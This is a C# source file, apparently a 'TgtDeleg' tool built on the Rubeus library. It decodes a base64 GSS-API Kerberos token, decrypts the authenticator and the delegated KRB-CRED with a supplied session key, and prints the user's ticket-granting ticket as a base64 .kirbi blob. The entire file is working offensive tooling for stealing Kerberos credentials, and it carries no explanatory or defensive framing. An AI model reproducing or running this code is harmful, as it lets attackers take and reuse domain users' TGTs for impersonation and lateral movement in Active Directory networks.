using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.ComponentModel;

using Rubeus;

namespace TgtDeleg
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                if (args.Length == 0)
                {
                    return;
                }

                byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2
                var ClientTokenArray = Convert.FromBase64String(args[0]);
                var index = Helpers.SearchBytePattern(KeberosV5, ClientTokenArray);
                if (index > 0)
                {
                    var startIndex = index += KeberosV5.Length;
                    if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex + 1] == 0))
                    {
                        startIndex += 2;
                        var apReqArray = new byte[ClientTokenArray.Length - startIndex];
                        Buffer.BlockCopy(ClientTokenArray, startIndex, apReqArray, 0, apReqArray.Length);
                        var asn_AP_REQ = Asn1.AsnElt.Decode(apReqArray, false);

                        foreach (var elt in asn_AP_REQ.Sub[0].Sub)
                        {
                            if (elt.TagValue == 4)
                            {
                                // build the encrypted authenticator
                                var encAuthenticator = new EncryptedData(elt.Sub[0]);
                                var authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
                                Console.WriteLine("[*] Authenticator etype: 0x{1} ({0})", authenticatorEtype, ((int)authenticatorEtype).ToString("X"));
                                byte[] key;
                                if (args.Length == 2)
                                {
                                    key = Convert.FromBase64String(args[1]);
                                }
                                else
                                {
                                    return;
                                }
                                var rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);
                                var asnAuthenticator = Asn1.AsnElt.Decode(rawBytes, false);

                                foreach (var elt2 in asnAuthenticator.Sub[0].Sub)
                                {
                                    if (elt2.TagValue == 3)
                                    {
                                        var cksumtype = Convert.ToInt32(elt2.Sub[0].Sub[0].Sub[0].GetInteger());

                                        // check if cksumtype == GSS_CHECKSUM_TYPE
                                        if (cksumtype == 0x8003)
                                        {
                                            var checksumBytes = elt2.Sub[0].Sub[1].Sub[0].GetOctetString();

                                            // check if the flags include GSS_C_DELEG_FLAG
                                            if ((checksumBytes[20] & 1) == 1)
                                            {
                                                var dLen = BitConverter.ToUInt16(checksumBytes, 26);
                                                var krbCredBytes = new byte[dLen];
                                                // copy out the krbCredBytes from the checksum structure
                                                Buffer.BlockCopy(checksumBytes, 28, krbCredBytes, 0, dLen);

                                                var asn_KRB_CRED = Asn1.AsnElt.Decode(krbCredBytes, false);
                                                Ticket ticket = null;
                                                var cred = new KRB_CRED();

                                                foreach (var elt3 in asn_KRB_CRED.Sub[0].Sub)
                                                {
                                                    if (elt3.TagValue == 2)
                                                    {
                                                        // extract the TGT and add it to the KRB-CRED
                                                        ticket = new Ticket(elt3.Sub[0].Sub[0].Sub[0]);
                                                        cred.tickets.Add(ticket);
                                                    }
                                                    else if (elt3.TagValue == 3)
                                                    {
                                                        var enc_part = elt3.Sub[0].Sub[1].GetOctetString();
                                                        var rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);
                                                        var encKrbCredPartAsn = Asn1.AsnElt.Decode(rawBytes2, false);
                                                        cred.enc_part.ticket_info.Add(new KrbCredInfo(encKrbCredPartAsn.Sub[0].Sub[0].Sub[0].Sub[0]));
                                                    }
                                                }

                                                var kirbiBytes = cred.Encode().Encode();
                                                var kirbiString = Convert.ToBase64String(kirbiBytes);
                                                Console.WriteLine("[*] Ticket: {0}", kirbiString);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
